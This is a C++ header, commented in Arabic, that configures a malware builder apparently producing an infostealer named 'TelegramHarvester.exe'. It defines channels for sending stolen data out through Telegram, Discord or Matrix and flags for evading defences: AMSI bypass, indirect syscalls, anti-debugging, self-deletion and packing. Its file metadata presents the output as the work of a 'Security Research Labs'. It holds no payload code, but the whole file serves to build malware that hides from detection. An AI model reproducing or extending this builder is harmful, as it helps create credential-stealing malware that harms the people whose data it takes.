// builder/config.h – إعدادات مشتركة بين أداة التجميع والقوالب
#pragma once
#include <string>
#include <cstdint>

namespace BuilderConfig {
    // إصدار الأداة
    constexpr const char* VERSION = "1.0.0";
    
    // القنوات المدعومة
    enum class ExfilChannel : uint8_t {
        TELEGRAM = 0,
        DISCORD = 1,
        MATRIX = 2
    };
    
    // أعلام التجاوز (سيتم تحويلها إلى تعريفات preprocessor في القالب)
    struct EvasionFlags {
        bool useIndirectSyscalls = true;
        bool useAmsiBypass = true;
        bool useAntiDebug = true;
        bool usePayloadSplitting = false;  // افتراضياً معطل
        bool useSelfDelete = true;
        bool useUpxCompression = false;
    };
    
    // بنية تخزن إعدادات البناء النهائي
    struct BuildSettings {
        std::string botToken;
        std::string chatId;
        ExfilChannel channel = ExfilChannel::TELEGRAM;
        std::string discordWebhook;
        std::string matrixHomeserver;
        std::string matrixAccessToken;
        std::string matrixRoomId;
        EvasionFlags evasion;
        std::string customIconPath;
        std::string outputFileName = "TelegramHarvester.exe";
        std::string companyName = "Security Research Labs";
        std::string copyright = "© 2025 Security Research. All rights reserved.";
        std::string fileVersion = "1.0.0.0";
    };
}